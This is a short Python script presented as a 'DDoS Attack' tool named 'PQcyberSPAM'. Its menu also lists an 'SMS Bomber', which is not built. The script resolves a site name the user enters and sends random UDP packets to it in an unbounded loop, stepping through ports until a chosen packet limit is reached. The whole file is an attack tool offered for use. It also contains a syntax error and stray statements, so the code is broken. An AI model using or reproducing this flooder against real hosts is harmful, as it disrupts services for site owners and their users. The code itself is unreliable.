import sys
import os
import time
import socket
import random

os.system("clear")
os.system("figlet DDos Attack")

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

sent = 0
limit = 0
app = 0

print('##########################################')
print ('Wellcome to PQcyberSPAM softing')
print()
print()
print ('Get SOFT')
print ('[1] - DDoS Attack http://SITE')
print ('[2] - SMS Bomber')
print('##########################################')
print()
print()
print()
print
app = int(input('select a number to launch the app'))
if app == 1:
    print
site = input('Имя сайта: ')
ip = socket.gethostbyname(site) 

print ('Site IP: ',ip)
#print(ip)

print
port = int(input('port: '))
print
limit = int(input('attack limit: '))

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ('Sent %s packet to %s throught port:%s'%(sent,ip,port))
     if sent = limit:
          sys.exit()
     if port == 65534:
       port = 1

